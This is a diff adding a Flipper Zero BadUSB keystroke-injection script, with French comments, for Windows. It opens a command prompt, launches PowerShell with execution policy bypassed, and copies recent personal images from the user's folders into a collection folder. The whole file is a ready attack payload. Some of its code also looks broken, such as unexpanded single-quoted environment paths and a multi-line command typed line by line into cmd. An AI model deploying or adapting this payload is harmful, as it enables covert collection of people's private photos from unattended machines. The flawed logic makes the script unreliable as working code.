@@ -1,0 +1,189 @@
+REM ================================================================
+REM Flipper Zero BadUSB - Extracteur d'Images Rapide
+REM ================================================================
+REM Nom: Extraction Rapide (Quick Extract)
+REM Description: Extraction rapide des images récentes (30 derniers jours)
+REM Cible: Windows 7/8/10/11 (PowerShell 2.0+)
+REM Auteur: Plume-Paopedia
+REM Version: 1.0
+REM Durée: < 5 minutes
+REM Privilèges: Utilisateur standard (pas d'admin requis)
+REM ================================================================
+
+REM Configuration du délai par défaut pour optimiser la vitesse
+DEFAULT_DELAY 300
+
+REM Ouverture de l'invite de commandes Windows avec privilèges utilisateur
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+
+REM Création du dossier de destination sur le Bureau
+STRING cd %USERPROFILE%\Desktop
+ENTER
+DELAY 300
+STRING mkdir Images_Extraites_Rapide_2024 >nul 2>&1
+ENTER
+DELAY 300
+STRING cd Images_Extraites_Rapide_2024
+ENTER
+DELAY 300
+
+REM Affichage du message de démarrage
+STRING echo ============================================
+ENTER
+STRING echo EXTRACTION RAPIDE D'IMAGES EN COURS...
+ENTER
+STRING echo Recherche des images des 30 derniers jours
+ENTER
+STRING echo ============================================
+ENTER
+DELAY 500
+
+REM Lancement du script PowerShell d'extraction rapide
+STRING powershell.exe -ExecutionPolicy Bypass -WindowStyle Normal -Command "& {
+ENTER
+DELAY 300
+
+REM Script PowerShell optimisé pour l'extraction rapide
+STRING try {
+ENTER
+STRING   Write-Host 'Démarrage de l extraction rapide...' -ForegroundColor Green
+ENTER
+DELAY 200
+STRING   $dateLimit = (Get-Date).AddDays(-30)
+ENTER
+STRING   $extensions = @('*.jpg','*.jpeg','*.png','*.gif','*.bmp','*.webp','*.ico','*.tiff','*.tif','*.jfif')
+ENTER
+DELAY 200
+STRING   $locations = @(
+ENTER
+STRING     '$env:USERPROFILE\Pictures',
+ENTER
+STRING     '$env:USERPROFILE\Desktop', 
+ENTER
+STRING     '$env:USERPROFILE\Documents',
+ENTER
+STRING     '$env:USERPROFILE\Downloads'
+ENTER
+STRING   )
+ENTER
+DELAY 200
+
+STRING   $count = 0
+ENTER
+STRING   $totalSize = 0
+ENTER
+DELAY 200
+
+STRING   foreach ($location in $locations) {
+ENTER
+STRING     if (Test-Path $location) {
+ENTER
+STRING       Write-Host 'Scan: ' $location -ForegroundColor Yellow
+ENTER
+STRING       foreach ($ext in $extensions) {
+ENTER
+STRING         try {
+ENTER
+STRING           $files = Get-ChildItem -Path $location -Filter $ext -Recurse -ErrorAction SilentlyContinue | Where-Object {
+ENTER
+STRING             $_.LastWriteTime -gt $dateLimit -and $_.Length -lt 10MB -and -not $_.PSIsContainer
+ENTER
+STRING           }
+ENTER
+DELAY 200
+STRING           foreach ($file in $files) {
+ENTER
+STRING             try {
+ENTER
+STRING               $newName = $file.Directory.Name + '_' + $file.Name
+ENTER
+STRING               Copy-Item $file.FullName -Destination .\$newName -ErrorAction SilentlyContinue
+ENTER
+STRING               $count++
+ENTER
+STRING               $totalSize += $file.Length
+ENTER
+STRING               if ($count % 10 -eq 0) { Write-Host $count 'images copiées...' -ForegroundColor Cyan }
+ENTER
+STRING             } catch { }
+ENTER
+STRING           }
+ENTER
+STRING         } catch { }
+ENTER
+STRING       }
+ENTER
+STRING     }
+ENTER
+STRING   }
+ENTER
+DELAY 300
+
+REM Affichage des statistiques finales
+STRING   Write-Host '============================================' -ForegroundColor Green
+ENTER
+STRING   Write-Host 'EXTRACTION RAPIDE TERMINÉE!' -ForegroundColor Green  
+ENTER
+STRING   Write-Host 'Images extraites: ' $count -ForegroundColor White
+ENTER
+STRING   Write-Host 'Taille totale: ' ([math]::Round($totalSize/1MB,2)) 'MB' -ForegroundColor White
+ENTER
+STRING   Write-Host 'Dossier: ' (Get-Location) -ForegroundColor White
+ENTER
+STRING   Write-Host '============================================' -ForegroundColor Green
+ENTER
+DELAY 300
+
+REM Création d'un fichier de rapport
+STRING   $report = @()
+ENTER
+STRING   $report += 'RAPPORT D EXTRACTION RAPIDE'
+ENTER
+STRING   $report += 'Date: ' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+ENTER
+STRING   $report += 'Images extraites: ' + $count
+ENTER
+STRING   $report += 'Taille totale: ' + ([math]::Round($totalSize/1MB,2)) + ' MB'
+ENTER
+STRING   $report += 'Période: 30 derniers jours'
+ENTER
+STRING   $report | Out-File -FilePath '.\RAPPORT_EXTRACTION_RAPIDE.txt' -Encoding UTF8
+ENTER
+DELAY 200
+
+STRING } catch {
+ENTER
+STRING   Write-Host 'Erreur PowerShell, basculement vers CMD...' -ForegroundColor Red
+ENTER
+STRING   cmd /c 'echo Extraction en mode CMD non implémentée dans cette version rapide'
+ENTER
+STRING }
+ENTER
+
+REM Finalisation du script PowerShell
+STRING }"
+ENTER
+DELAY 2000
+
+REM Ouverture du dossier de résultats
+STRING explorer .
+ENTER
+DELAY 1000
+
+REM Message de fin et nettoyage
+STRING echo.
+ENTER
+STRING echo Extraction rapide terminée! Vérifiez le dossier Images_Extraites_Rapide_2024
+ENTER
+STRING echo Appuyez sur une touche pour fermer...
+ENTER
+STRING pause >nul
+ENTER
+
+REM Fermeture de la fenêtre de commande
+STRING exit
+ENTER
